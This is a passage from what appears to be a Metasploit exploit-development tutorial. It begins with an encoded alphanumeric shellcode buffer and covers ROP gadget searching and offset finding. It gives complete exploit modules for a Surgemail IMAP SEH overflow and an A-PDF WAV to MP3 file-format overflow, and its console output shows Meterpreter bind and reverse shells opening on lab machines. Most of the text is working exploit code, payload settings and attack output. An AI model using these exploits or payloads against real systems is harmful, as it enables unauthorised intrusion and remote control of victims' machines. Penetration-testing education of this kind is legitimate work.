 buf += "\x6c\x4b\x62\x72\x52\x30\x6c\x4b\x63\x7a\x57\x4c\x6c"
 buf += "\x4b\x32\x6c\x54\x51\x63\x48\x4a\x43\x37\x38\x33\x31"
 buf += "\x6e\x31\x42\x71\x4e\x6b\x62\x79\x55\x70\x37\x71\x7a"
 buf += "\x73\x6e\x6b\x50\x49\x76\x78\x78\x63\x55\x6a\x47\x39"
 buf += "\x6e\x6b\x45\x64\x6e\x6b\x55\x51\x4a\x76\x64\x71\x69"
 buf += "\x6f\x4e\x4c\x7a\x61\x78\x4f\x54\x4d\x36\x61\x79\x57"
 buf += "\x74\x78\x79\x70\x74\x35\x68\x76\x35\x53\x51\x6d\x38"
 buf += "\x78\x75\x6b\x31\x6d\x56\x44\x31\x65\x59\x74\x56\x38"
 buf += "\x4c\x4b\x33\x68\x55\x74\x75\x51\x4e\x33\x73\x56\x4c"
 buf += "\x4b\x76\x6c\x52\x6b\x4c\x4b\x66\x38\x65\x4c\x63\x31"
 buf += "\x4b\x63\x6e\x6b\x64\x44\x6e\x6b\x35\x51\x6e\x30\x4c"
 buf += "\x49\x73\x74\x61\x34\x31\x34\x73\x6b\x73\x6b\x75\x31"
 buf += "\x70\x59\x72\x7a\x36\x31\x4b\x4f\x79\x70\x53\x6f\x61"
 buf += "\x4f\x63\x6a\x4e\x6b\x35\x42\x68\x6b\x4e\x6d\x61\x4d"
 buf += "\x61\x78\x34\x73\x56\x52\x55\x50\x53\x30\x53\x58\x63"
 buf += "\x47\x33\x43\x74\x72\x51\x4f\x66\x34\x75\x38\x50\x4c"
 buf += "\x43\x47\x55\x76\x54\x47\x6b\x4f\x6e\x35\x4e\x58\x5a"
 buf += "\x30\x53\x31\x43\x30\x75\x50\x36\x49\x38\x44\x42\x74"
 buf += "\x52\x70\x73\x58\x35\x79\x6f\x70\x72\x4b\x45\x50\x69"
 buf += "\x6f\x49\x45\x70\x6a\x74\x4b\x72\x79\x42\x70\x4b\x52"
 buf += "\x79\x6d\x31\x7a\x65\x51\x73\x5a\x65\x52\x73\x58\x38"
 buf += "\x6a\x64\x4f\x59\x4f\x59\x70\x79\x6f\x59\x45\x4a\x37"
 buf += "\x50\x68\x46\x62\x67\x70\x67\x61\x61\x4c\x4f\x79\x6b"
 buf += "\x56\x53\x5a\x74\x50\x71\x46\x43\x67\x63\x58\x7a\x62"
 buf += "\x39\x4b\x70\x37\x53\x57\x69\x6f\x4a\x75\x4b\x35\x6b"
 buf += "\x70\x54\x35\x72\x78\x46\x37\x52\x48\x6d\x67\x6a\x49"
 buf += "\x54\x78\x69\x6f\x39\x6f\x5a\x75\x31\x47\x51\x78\x62"
 buf += "\x54\x48\x6c\x75\x6b\x79\x71\x79\x6f\x4a\x75\x43\x67"
 buf += "\x6a\x37\x43\x58\x42\x55\x72\x4e\x52\x6d\x31\x71\x6b"
 buf += "\x4f\x4a\x75\x30\x6a\x75\x50\x71\x7a\x44\x44\x70\x56"
 buf += "\x63\x67\x51\x78\x65\x52\x59\x49\x49\x58\x61\x4f\x79"
 buf += "\x6f\x5a\x75\x4b\x33\x6c\x38\x45\x50\x43\x4e\x54\x6d"
 buf += "\x4e\x6b\x46\x56\x52\x4a\x53\x70\x31\x78\x53\x30\x76"
 buf += "\x70\x37\x70\x55\x50\x46\x36\x42\x4a\x65\x50\x52\x48"
 buf += "\x51\x48\x6d\x74\x33\x63\x38\x65\x39\x6f\x6e\x35\x5a"
 buf += "\x33\x52\x73\x63\x5a\x75\x50\x42\x76\x46\x33\x43\x67"
 buf += "\x63\x58\x74\x42\x48\x59\x7a\x68\x73\x6f\x39\x6f\x78"
 buf += "\x55\x4f\x73\x69\x68\x65\x50\x73\x4e\x64\x47\x45\x51"
 buf += "\x6a\x63\x34\x69\x6a\x66\x72\x55\x4d\x39\x49\x53\x41"
 buf += "\x41"



This time we obtained a pure alphanumeric shellcode:

::

  >>> print buf
 IIIIIIIIIIIIIIIII7QZjAXP0A0AkAAQ2AB2BB0BBABXP8ABuJIkLIxk2GpC0wpapk9IufQ9PpdLKF0dpLKSbvlNkQBB4LKcBq8dOlwrjUvV
 QYoNLulU1SL32Tlq0zaXO4M6ahGKRIbCbrwNkf2vplK3zElNkrlR1D88cRhfaKaRqlKaIa05Q9Cnksy4XzCdzBiNk5dlKgqn6dqYoLl9QzoF
 mgqyWgHIpPuzV4CsMjXwKQmUtt5M4BxNk1HUtEQzs56nkFl0KLKaHGlGqzslKwtlKGqJpK9PDTd7TCkckqq693jCaIom0sosobznkr2Xknma
 MBHVSTrc0C0BHqgcCDr3oaDu8RlBW16c7KOXULxZ0S1C05PQ9jdqDrp3XEyOpBKgpyo9Eqz6kbyV08bIm2JfaqzTBU8zJ4OkoYpIohUz72HF
 bePVqSlNi8fbJTPv6Rw0hJbKkVWRGioKeLEIP1ev81GRHMgM9vXkO9oHUqGBHadZL5k9qKO8UbwlWaxaerNrm0aIon51zwp1zfdaFV7u8eRJ
 yxHaOkO8UNc8xS0SNTmLKFVazqPsX5PfpS0EPaFazUP2HbxOTbsIu9ozunsf3pj30Sf1CbwbH32HYhHQOKOjuos8xuPQnUWwq8Cti9V1eIyZ
 cAA

In this case, we told msfencode that we took care of finding the shellcodes absolute address and we saved it in the ECX register:

As you can see in the previous image, ECX was previously set in order to point to the beginning of our alphanumeric shellcode. At this point, our payload starts directly realigning ECX to begin the shellcode decoding sequence.


MSFrop
^^^^^^^^^^


**Searching Code Vulnerabilities with MSFrop**

As you develop exploits for newer versions of the Windows operation systems, you will find that they now have Data Execution Prevention (DEP) enabled by default. DEP prevents shellcode from being executed on the stack and has forced exploit developers to find a way around this mitigation and the so-called Return Oriented Programming (ROP) was developed.

A ROP payload in created by using pre-existing sets of instructions from non-ASLR enabled binaries to make your shellcode executable. Each set of instructions needs to end in a RETN instruction to carry on the ROP-chain with each set of instructions commonly referred to as a gadget.

The “msfrop” tool in Metasploit will search a given binary and return the usable gadgets.

::

  root@kali:# msfrop -h

 Options:
    -d, --depth [size]               Number of maximum bytes to backwards disassemble from return instructions
    -s, --search [regex]             Search for gadgets matching a regex, match intel syntax or raw bytes
    -n, --nocolor                    Disable color. Useful for piping to other tools like the less and more commands
    -x, --export [filename]          Export gadgets to CSV format
    -i, --import [filename]          Import gadgets from previous collections
    -v, --verbose                    Output very verbosely
    -h, --help                       Show this message


Running msfrop with the -v switch will return all of the found gadgets directly to the console:


::

  root@kali:/tmp# msfrop -v metsrv.dll
 Collecting gadgets from metsrv.dll
 Found 4829 gadgets

 metsrv.dll gadget: 0x10001057
 0x10001057:	leave
 0x10001058:	ret

 metsrv.dll gadget: 0x10001241
 0x10001241:	leave
 0x10001242:	ret

 metsrv.dll gadget: 0x1000132e
 0x1000132e:	leave
 0x1000132f:	ret

 metsrv.dll gadget: 0x1000138c
 0x1000138c:	leave
 0x1000138d:	ret
 ...snip...


The verbose msfrop output is not particularly helpful when a binary contains thousands of gadgets, so a far more useful switch is ‘-x‘ which allows you to output the gadgets into a CSV file that you can then search later.


::

  root@kali:/tmp# msfrop -x metsrv_gadgets metsrv.dll
 Collecting gadgets from metsrv.dll
 Found 4829 gadgets

 Found 4829 gadgets total

 Exporting 4829 gadgets to metsrv_gadgets
 Success! gadgets exported to metsrv_gadgets
 root@kali:/tmp# head -n 10 metsrv_gadgets
 Address,Raw,Disassembly
 "0x10001098","5ec20c00","0x10001098: pop esi | 0x10001099: ret 0ch | "
 "0x100010f7","5ec20800","0x100010f7: pop esi | 0x100010f8: ret 8 | "
 "0x1000113d","5dc21800","0x1000113d: pop ebp | 0x1000113e: ret 18h | "
 "0x1000117a","5dc21c00","0x1000117a: pop ebp | 0x1000117b: ret 1ch | "
 "0x100011c3","5dc22800","0x100011c3: pop ebp | 0x100011c4: ret 28h | "
 "0x100018b5","5dc20c00","0x100018b5: pop ebp | 0x100018b6: ret 0ch | "
 "0x10002cb4","c00f9fc28d54","0x10002cb4: ror byte ptr [edi], 9fh | 0x10002cb7: ret 548dh | "
 "0x10002df8","0483c20483","0x10002df8: add al, -7dh | 0x10002dfa: ret 8304h | "
 "0x10002e6e","080bc20fb6","0x10002e6e: or [ebx], cl | 0x10002e70: ret 0b60fh | "
 root@kali:/tmp#


Writing an Exploit
================

Improving our Exploit Development
^^^^^^^^^^^^^^^^^^^^^^^^

Previously we looked at Fuzzing an IMAP server in the Simple IMAP Fuzzer section. At the end of that effort we found that we could overwrite EIP, making ESP the only register pointing to a memory location under our control (4 bytes after our return address). We can go ahead and rebuild our buffer (fuzzed = “A”*1004 + “B”*4 + “C”*4) to confirm that the execution flow is redirectable through a JMP ESP address as a ret.

::

  msf auxiliary(fuzz_imap) > run

 [*] Connecting to IMAP server 172.16.30.7:143...
 [*] Connected to target IMAP server.
 [*] Authenticating as test with password test...
 [*] Generating fuzzed data...
 [*] Sending fuzzed data, buffer length = 1012
 [*] 0002 LIST () /"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]BBBBCCCC" "PWNED"
 [*] Connecting to IMAP server 172.16.30.7:143...
 [*] Connected to target IMAP server.
 [*] Authenticating as test with password test...
 [*] Authentication failed
 [*] It seems that host is not responding anymore and this is G00D ;)
 [*] Auxiliary module execution completed
 msf auxiliary(fuzz_imap) >


Controlling Execution Flow
^^^^^^^^^^^^^^^^^^


We now need to determine the correct offset in order get code execution. Fortunately, Metasploit comes to the rescue with two very useful utilities: pattern_create.rb and pattern_offset.rb. Both of these scripts are located in Metasploit’s ‘tools’ directory. By running pattern_create.rb , the script will generate a string composed of unique patterns that we can use to replace our sequence of ‘A’s.


Example :

::

  root@kali:~# /usr/share/metasploit-framework/tools/pattern_create.rb 11000
 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0A
 c1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2
 Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5...

After we have successfully overwritten EIP or SEH (or whatever register you are aiming for), we must take note of the value contained in the register and feed this value to pattern_offset.rb to determine at which point in the random string the value appears.

Rather than calling the command line pattern_create.rb, we will call the underlying API directly from our fuzzer using the Rex::Text.pattern_create(). If we look at the source, we can see how this function is called.

::

  def self.pattern_create(length, sets = [ UpperAlpha, LowerAlpha, Numerals ])
       buf = ''
       idx = 0
       offsets = []
       sets.length.times { offsets >> 0 }
       until buf.length >= length
               begin
                       buf >> converge_sets(sets, 0, offsets, length)
               rescue RuntimeError
                       break
               end
       end
       # Maximum permutations reached, but we need more data
       if (buf.length > length)
               buf = buf * (length / buf.length.to_f).ceil
       end
       buf[0,length]
 end

So we see that we call the pattern_create function which will take at most two parameters, the size of the buffer we are looking to create and an optional second paramater giving us some control of the contents of the buffer. So for our needs, we will call the function and replace our fuzzed variable with fuzzed = Rex::Text.pattern_create(11000).

This causes our SEH to be overwritten by 0x684E3368 and based on the value returned by pattern_offset.rb, we can determine that the bytes that overwrite our exception handler are the next four bytes 10361, 10362, 10363, 10364.

::

  root@kali:~# /usr/share/metasploit-framework/tools/pattern_create.rb 684E3368 11000 10360


As it often happens in SEH overflow attacks, we now need to find a POP POP RET (other sequences are good as well as explained in “Defeating the Stack Based Buffer Overflow Prevention Mechanism of Microsoft Windows 2003 Server” Litchfield 2003) address in order to redirect the execution flow to our buffer. However, searching for a suitable return address in surgemail.exe, obviously leads us to the previously encountered problem, all the addresses have a null byte.


::

  root@kali:~# msfpescan -p surgemail.exe

 [surgemail.exe]
 0x0042e947 pop esi; pop ebp; ret
 0x0042f88b pop esi; pop ebp; ret
 0x00458e68 pop esi; pop ebp; ret
 0x00458edb pop esi; pop ebp; ret
 0x00537506 pop esi; pop ebp; ret
 0x005ec087 pop ebx; pop ebp; ret

 0x00780b25 pop ebp; pop ebx; ret
 0x00780c1e pop ebp; pop ebx; ret
 0x00784fb8 pop ebx; pop ebp; ret
 0x0078506e pop ebx; pop ebp; ret
 0x00785105 pop ecx; pop ebx; ret
 0x0078517e pop esi; pop ebx; ret


Fortunately this time we have a further attack approach to try in the form of a partial overwrite, overflowing SEH with only the 3 lowest significant bytes of the return address. The difference is that this time we can put our shellcode into the first part of the buffer following a schema like the following:

::

  | NOPSLED | SHELLCODE | NEARJMP | SHORTJMP | RET (3 Bytes) |

POP POP RET will redirect us 4 bytes before RET where we will place a short JMP taking us 5 bytes back. We’ll then have a near back JMP that will take us in the middle of the NOPSLED.

This was not possible to do with a partial overwrite of EIP and ESP, as due to the stack arrangement ESP was four bytes after our RET. If we did a partial overwrite of EIP, ESP would then be in an uncontrollable area.

Next up, writing an exploit and getting a shell with what we’ve learned about our code improvements.


Getting a Shell
^^^^^^^^^^^^^^

Writing an Exploit Module
"""""""""""""""""""""""

With what we have learned, we write the exploit and save it to ‘windows/imap/surgemail_list.rb’. Let’s take a look at our new exploit module below:

::

  ##
  # This file is part of the Metasploit Framework and may be subject to
  # redistribution and commercial restrictions. Please see the Metasploit
  # Framework web site for more information on licensing and terms of use.
  # http://metasploit.com/projects/Framework/
  ##


 require 'msf/core'


 class Metasploit3 > Msf::Exploit::Remote

    include Msf::Exploit::Remote::Imap

    def initialize(info = {})
        super(update_info(info,
            'Name'           => 'Surgemail 3.8k4-4 IMAPD LIST Buffer Overflow',
            'Description'    => %q{
                This module exploits a stack overflow in the Surgemail IMAP Server
                version 3.8k4-4 by sending an overly long LIST command. Valid IMAP
                account credentials are required.
            },
            'Author'         => [ 'ryujin' ],
            'License'        => MSF_LICENSE,
            'Version'        => '$Revision: 1 $',
            'References'     =>
                [
                    [ 'BID', '28260' ],
                    [ 'CVE', '2008-1498' ],
                    [ 'URL', 'http://www.milw0rm.com/exploits/5259' ],
                ],
            'Privileged'     => false,
            'DefaultOptions' =>
                {
                    'EXITFUNC' => 'thread',
                },
            'Payload'        =>
                {
                    'Space'       => 10351,
                    'EncoderType' => Msf::Encoder::Type::AlphanumMixed,
                    'DisableNops' => true,
                    'BadChars'    => "\x00"
                },
            'Platform'       => 'win',
            'Targets'        =>
                [
                    [ 'Windows Universal', { 'Ret' => "\x7e\x51\x78" } ], # p/p/r 0x0078517e
                ],
            'DisclosureDate' => 'March 13 2008',
            'DefaultTarget' => 0))
    end

    def check
        connect
        disconnect
        if (banner and banner =~ /(Version 3.8k4-4)/)
            return Exploit::CheckCode::Vulnerable
        end
        return Exploit::CheckCode::Safe
    end

    def exploit
        connected = connect_login
        nopes = "\x90"*(payload_space-payload.encoded.length) # to be fixed with make_nops()
        sjump = "\xEB\xF9\x90\x90"     # Jmp Back
        njump = "\xE9\xDD\xD7\xFF\xFF" # And Back Again Baby  ;)
        evil = nopes + payload.encoded + njump + sjump + [target.ret].pack("A3")
        print_status("Sending payload")
        sploit = '0002 LIST () "/' + evil + '" "PWNED"' + "\r\n"
        sock.put(sploit)
        handler
        disconnect
    end

 end

The most important things to notice in the previous exploit code are the following:

* We defined the maximum space for the shellcode (Space => 10351) and set the DisableNops feature to disable the automatic shellcode padding, we’ll pad the payload on our own.
* We set the default encoder to the AlphanumMixed because of the nature of the IMAP protocol.
* We defined our 3 bytes POP POP RET return address that will be then referenced through the target.ret variable.
* We defined a check function which can check the IMAP server banner in order to identify a vulnerable server and an exploit function that obviously is the one that does most of the work.

 Let’s see if it works:

 ::

   msf > search surgemail
 [*] Searching loaded modules for pattern 'surgemail'...

 Exploits
 ========

 Name                         Description
 ----                         -----------
 windows/imap/surgemail_list  Surgemail 3.8k4-4 IMAPD LIST Buffer Overflow


 msf > use windows/imap/surgemail_list
 msf exploit(surgemail_list) > show options

 Module options:

 Name      Current Setting  Required  Description
 ----      ---------------  --------  -----------
 IMAPPASS  test             no        The password for the specified username
 IMAPUSER  test             no        The username to authenticate as
 RHOST     172.16.30.7      yes       The target address
 RPORT     143              yes       The target port

 Payload options (windows/shell/bind_tcp):

 Name      Current Setting  Required  Description
 ----      ---------------  --------  -----------
 EXITFUNC  thread           yes       Exit technique: seh, thread, process
 LPORT     4444             yes       The local port
 RHOST     172.16.30.7      no        The target address

 Exploit target:

 Id  Name
 --  ----
 0   Windows Universal


Testing our Exploit Module
^^^^^^^^^^^^^^^^^^^^^^^^

Some of the options are already configured from our previous session (see IMAPPASS, IMAPUSER and RHOST for example). Now we check for the server version:

::

  msf exploit(surgemail_list) > check

 [*] Connecting to IMAP server 172.16.30.7:143...
 [*] Connected to target IMAP server.
 [+] The target is vulnerable.


Yes! Now let’s run the exploit attaching the debugger to the surgemail.exe process to see if the offset to overwrite SEH is correct:


::

  root@kali:~# msfconsole -q -x "use exploit/windows/imap/surgemail_list; set PAYLOAD windows/shell/bind_tcp; set  RHOST 172.16.30.7; set  IMAPPWD test; set IMAPUSER test; run; exit -y"
 [*] Started bind handler
 [*] Connecting to IMAP server 172.16.30.7:143...
 [*] Connected to target IMAP server.
 [*] Authenticating as test with password test...
 [*] Sending payload


The offset is correct, we can now set a breakpoint at our return address:

Now we can redirect the execution flow into our buffer executing the POP POP RET instructions:

and finally execute the two jumps on the stack which will land us inside our NOP sled:

So far so good, time to get our Meterpreter shell, let’s rerun the exploit without the debugger:

::

  msf exploit(surgemail_list) > set PAYLOAD windows/meterpreter/bind_tcp
 PAYLOAD => windows/meterpreter/bind_tcp
 msf exploit(surgemail_list) > exploit

 [*] Connecting to IMAP server 172.16.30.7:143...
 [*] Started bind handler
 [*] Connected to target IMAP server.
 [*] Authenticating as test with password test...
 [*] Sending payload
 [*] Transmitting intermediate stager for over-sized stage...(191 bytes)
 [*] Sending stage (2650 bytes)
 [*] Sleeping before handling stage...
 [*] Uploading DLL (75787 bytes)...
 [*] Upload completed.
 [*] Meterpreter session 1 opened (172.16.30.34:63937 -> 172.16.30.7:4444)

 meterpreter > execute -f cmd.exe -c -i
 Process 672 created.
 Channel 1 created.
 Microsoft Windows XP [Version 5.1.2600]
 (C) Copyright 1985-2001 Microsoft Corp.

 c:\surgemail>


Using the Egghunter Mixin
========================

Going on an Egg-hunt
^^^^^^^^^^^^^^^^

The MSF egghunter mixin is a wonderful module which can be of great use in exploit development. If you’re not familiar with the concepts of egghunters, read this first.

A vulnerability in the Audacity Audio Editor presents us with an opportunity to examine this mixin in greater depth. In the next module, we will exploit Audacity and create a Metasploit file format exploit module for it. We will not focus on the exploitation method itself or the theory behind it – but dive right into the practical usage of the Egghunter mixin.

Please note, the following example uses Microsoft’s Windows XP SP2 as it’s target. If you wish to reproduce the following you’ll need to setup your own VM. If SP2 is not available to you, SP3 can be used but make sure to disable DEP in C:\boot.ini using the following: /noexecute=AlwaysOff

Setting up our Egg-hunt
^^^^^^^^^^^^^^^^^^^^

Todo


Porting Exploits
====================

Porting Exploits to the Metasploit Framework
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^


Although Metasploit is commercially owned, it is still an open source project and grows and thrives based on user-contributed modules. As there are only a handful of full-time developers on the team, there is a great opportunity to port existing public exploits to the Metasploit Framework. Porting exploits will not only help make Metasploit more versatile and powerful, it is also an excellent way to learn about the inner workings of the Framework and helps you improve your Ruby skills at the same time. One very important point to remember when writing Metasploit modules is that you *always* need to use hard tabs and not spaces. For a few other important module details, refer to the HACKING file located in the root of the Metasploit directory. There is some important information that will help ensure your submissions are quickly added to the trunk.

To begin, we’ll first need to obviously select an exploit to port over. We will use the A-PDF WAV to MP3 Converter exploit. When porting exploits, there is no need to start coding completely from scratch; we can simply select a pre-existing exploit module and modify it to suit our purposes. Since this is a fileformat exploit, we will look under modules/exploits/windows/fileformat/ off the main Metasploit directory for a suitable candidate. This particular exploit is a SEH overwrite so we need to find an exploit module that uses the Msf::Exploit::Remote::Seh mixin. We can find this near the top of the exploit audiotran_pls.rb as shown below.

::

  require 'msf/core'

 class Metasploit3 > Msf::Exploit::Remote
        Rank = GoodRanking

        include Msf::Exploit::FILEFORMAT
        include Msf::Exploit::Remote::Seh


Keep your Exploit Modules Organized
^^^^^^^^^^^^^^^^^^^^^^^^^^

Having found a suitable template to use for our module, we then strip out everything specific to the existing module and save it under ~/.msf4/modules/exploits/windows/fileformat/. You may need to create the additional directories under your home directory if you are following along exactly. Note that it is possible to save the custom exploit module under the main Metasploit directory but it can cause issues when updating the framework if you end up submitting a module to be included in the trunk. Our stripped down exploit looks like this:

::

  ##
 # $Id: $
 ##

 ##
 # This file is part of the Metasploit Framework and may be subject to
 # redistribution and commercial restrictions. Please see the Metasploit
 # Framework web site for more information on licensing and terms of use.
 # http://metasploit.com/framework/
 ##

 require 'msf/core'

 class Metasploit3 > Msf::Exploit::Remote
    Rank = GoodRanking

    include Msf::Exploit::FILEFORMAT
    include Msf::Exploit::Remote::Seh

    def initialize(info = {})
        super(update_info(info,
            'Name'           => 'Exploit Title',
            'Description'    => %q{
                    Exploit Description
            },
            'License'        => MSF_LICENSE,
            'Author'         =>
                [
                    'Author'
                ],
            'Version'        => '$Revision: $',
            'References'     =>
                [
                    [ 'URL', 'http://www.somesite.com ],
                ],
            'Payload'        =>
                {
                    'Space'    => 6000,
                    'BadChars' => "\x00\x0a",
                    'StackAdjustment' => -3500,
                },
            'Platform' => 'win',
            'Targets'        =>
                [
                    [ 'Windows Universal', { 'Ret' =>  } ],
                ],
            'Privileged'     => false,
            'DisclosureDate' => 'Date',
            'DefaultTarget'  => 0))

            register_options(
                [
                    OptString.new('FILENAME', [ true, 'The file name.',  'filename.ext']),
                ], self.class)

    end

    def exploit

        print_status("Creating '#{datastore['FILENAME']}' file ...")

        file_create(sploit)

    end

 end


Now that our skeleton is ready, we can start plugging in the information from the public exploit, assuming that it has been tested and verified that it works. We start by adding the title, description, author(s), and references. Note that it is common courtesy to name the original public exploit authors as it was their hard work that found the bug in the first place.


::

  def initialize(info = {})
        super(update_info(info,
            'Name'           => 'A-PDF WAV to MP3 v1.0.0 Buffer Overflow',
            'Description'    => %q{
                    This module exploits a buffer overflow in A-PDF WAV to MP3 v1.0.0. When
                the application is used to import a specially crafted m3u file, a buffer overflow occurs
                allowing arbitrary code execution.
            },
            'License'        => MSF_LICENSE,
            'Author'         =>
                [
                    'd4rk-h4ck3r',         # Original Exploit
                    'Dr_IDE',        # SEH Exploit
                    'dookie'        # MSF Module
                ],
            'Version'        => '$Revision: $',
            'References'     =>
                [
                    [ 'URL', 'http://www.exploit-db.com/exploits/14676/' ],
                    [ 'URL', 'http://www.exploit-db.com/exploits/14681/' ],
                ],

Everything is self-explanatory to this point and other than the Metasploit module structure, there is nothing complicated going on so far. Carrying on farther in the module, we’ll ensure the EXITFUNC is set to ‘seh‘ and set ‘DisablePayloadHandler‘ to ‘true‘ to eliminate any conflicts with the payload handler waiting for the shell. While studying the public exploit in a debugger, we have determined that there are approximately 600 bytes of space available for shellcode and that \x00 and \x0a are bad characters that will corrupt it. Finding bad characters is always tedious but to ensure exploit reliability, it is a necessary evil.

In the ‘Targets‘ section, we add the all-important pop/pop/retn return address for the exploit, the length of the buffer required to reach the SE Handler, and a comment stating where the address comes from. Since this return address is from the application binary, the target is ‘Windows Universal‘ in this case. Lastly, we add the date the exploit was disclosed and ensure the ‘DefaultTarget‘ value is set to 0.

::

  'DefaultOptions' =>
    {
        'EXITFUNC' => 'seh',
        'DisablePayloadHandler' => 'true'
    },
 'Payload'        =>
    {
        'Space'    => 600,
        'BadChars' => "\x00\x0a",
        'StackAdjustment' => -3500
    },
 'Platform' => 'win',
 'Targets'        =>
    [
        [ 'Windows Universal', { 'Ret' => 0x0047265c, 'Offset' => 4132 } ],    # p/p/r in wavtomp3.exe
    ],
 'Privileged'     => false,
 'DisclosureDate' => 'Aug 17 2010',
 'DefaultTarget'  => 0))


The last part we need to edit before moving on to the actual exploit is the register_options section. In this case, we need to tell Metasploit what the default filename will be for the exploit. In network-based exploits, this is where we would declare things like the default port to use.


::

  register_options(
         [
             OptString.new('FILENAME', [ false, 'The file name.', 'msf.wav']),
         ], self.class)

The final, and most interesting, section to edit is the exploit block where all of the pieces come together. First, rand_text_alpha_upper(target[‘Offset’]) will create our buffer leading up to the SE Handler using random, upper-case alphabetic characters using the length we specified in the Targets block of the module. Next, generate_seh_record(target.ret) adds the short jump and return address that we normally see in public exploits. The next part, make_nops(12), is pretty self-explanatory; Metasploit will use a variety of No-Op instructions to aid in IDS/IPS/AV evasion. Lastly, payload.encoded adds on the dynamically generated shellcode to the exploit. A message is printed to the screen and our malicious file is written to disk so we can send it to our target.

::

  def exploit

       sploit = rand_text_alpha_upper(target['Offset'])
       sploit >> generate_seh_record(target.ret)
       sploit >> make_nops(12)
       sploit >> payload.encoded

       print_status("Creating '#{datastore['FILENAME']}' file ...")

       file_create(sploit)

   end

Now that we have everything edited, we can take our newly created module for a test drive.

::

  msf > search a-pdf
 [*] Searching loaded modules for pattern 'a-pdf'...

 Exploits
 ========

   Name                                              Rank    Description
   ----                                              ----    -----------
   windows/browser/adobe_flashplayer_newfunction     normal  Adobe Flash Player "newfunction" Invalid Pointer Use
   windows/fileformat/a-pdf_wav_to_mp3               normal  A-PDF WAV to MP3 v1.0.0 Buffer Overflow
   windows/fileformat/adobe_flashplayer_newfunction  normal  Adobe Flash Player "newfunction" Invalid Pointer Use

 msf > use exploit/windows/fileformat/a-pdf_wav_to_mp3
 msf exploit(a-pdf_wav_to_mp3) > show options

 Module options:

   Name        Current Setting                                Required  Description
   ----        ---------------                                --------  -----------
   FILENAME    msf.wav                                        no        The file name.
   OUTPUTPATH  /usr/share/metasploit-framework/data/exploits  yes       The location of the file.


 Exploit target:

   Id  Name
   --  ----
   0   Windows Universal


 msf exploit(a-pdf_wav_to_mp3) > set OUTPUTPATH /var/www
 OUTPUTPATH => /var/www
 msf exploit(a-pdf_wav_to_mp3) > set PAYLOAD windows/meterpreter/reverse_tcp
 PAYLOAD => windows/meterpreter/reverse_tcp
 msf exploit(a-pdf_wav_to_mp3) > set LHOST 192.168.1.101
 LHOST => 192.168.1.101
 msf exploit(a-pdf_wav_to_mp3) > exploit

 [*] Started reverse handler on 192.168.1.101:4444
 [*] Creating 'msf.wav' file ...
 [*] Generated output file /var/www/msf.wav
 [*] Exploit completed, but no session was created.
 msf exploit(a-pdf_wav_to_mp3) >


Everything seems to be working fine so far. Now we just need to setup a Meterpreter listener and have our victim open up our malicious file in the vulnerable application.


::

  msf exploit(a-pdf_wav_to_mp3) > use exploit/multi/handler
 msf exploit(handler) > set PAYLOAD windows/meterpreter/reverse_tcp
 PAYLOAD => windows/meterpreter/reverse_tcp
 msf exploit(handler) > set LHOST 192.168.1.101
 LHOST => 192.168.1.101
 msf exploit(handler) > exploit

 [*] Started reverse handler on 192.168.1.101:4444
 [*] Starting the payload handler...
 [*] Sending stage (748544 bytes) to 192.168.1.160
 [*] Meterpreter session 1 opened (192.168.1.101:4444 -> 192.168.1.160:53983) at 2010-08-31 20:59:04 -0600

 meterpreter > sysinfo
 Computer: XEN-XP-PATCHED
 OS      : Windows XP (Build 2600, Service Pack 3).
 Arch    : x86
 Language: en_US
 meterpreter> getuid
 Server username: XEN-XP-PATCHED\Administrator
 meterpreter>


Success! Not all exploits are this easy to port over but the time spent is well worth it and helps to make an already excellent tool even better.

 For further information on porting exploits and contributing to Metasploit in general, see the following links:

 https://github.com/rapid7/metasploit-framework/blob/master/HACKING

https://github.com/rapid7/metasploit-framework/blob/master/CONTRIBUTING.md
